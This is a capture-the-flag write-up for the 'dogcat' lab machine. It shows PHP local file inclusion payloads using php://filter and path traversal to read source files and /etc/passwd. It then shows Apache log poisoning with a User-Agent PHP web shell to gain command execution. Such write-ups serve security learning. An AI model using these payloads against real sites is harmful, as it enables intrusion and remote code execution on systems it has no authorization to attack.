# dogcat

### dogcat
Nmap scan shows ports 22 and 80 open. `Gobuster` reveals the presence of a file called `flag.php`:<br />
![image](https://github.com/user-attachments/assets/f3527561-1727-47fb-bd14-3f8fc129f08e)<br />
After some testing, the following payload works to retrieve the code of `dog.php`: `http://10.10.181.198/?view=php://filter/read=convert.base64-encode/resource=dog`:<br />
![image](https://github.com/user-attachments/assets/905918ae-dd45-4f71-846f-67bfa1a742a8)<br />
To read the flag, I developed this payload: `http://10.10.25.29/?view=php://filter/read=convert.base64-encode/resource=./../../../../../usr/bin/cat/../../../var/www/html/flag`. It's built this way because the string needs to have the word "cat" or "dog" in it.<br />
![image](https://github.com/user-attachments/assets/016a6e00-8a7b-42ff-9f86-6c3bcae6fbb5)<br />
But now I want to see `/etc/passwd`. If I look at the source code of `index.php`:<br />
![Screenshot 2025-03-28 145653](https://github.com/user-attachments/assets/7ac238be-2da4-4ff8-80fc-10cfa37e849d)<br />
If a variable `ext` is not set, then it automatically adds `.php` at the end of the string. So the following payload will set `ext` to an empty string and will view `/etc/passwd`. Now I can perform log poisoning attack to get RCE. First, I send the following request by modifying the useragent to add php code into the access.log file: 

    GET /?ext=&view=/.dog/../../../../../var/log/apache2/access.log HTTP/1.1
    Host: 10.10.154.107
    User-Agent: <?php system($_GET['cmd']); ?>
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Connection: keep-alive
    Upgrade-Insecure-Requests: 1
    Priority: u=0, i
Now, If I perform the following request: `http://10.10.154.107/?ext=&view=/.dog/../../../../../var/log/apache2/access.log&cmd=whoami`, I get RCE:<br />
![image](https://github.com/user-attachments/assets/7b899c2a-9a62-48fa-9b2e-3fcef422cf5b)<br />
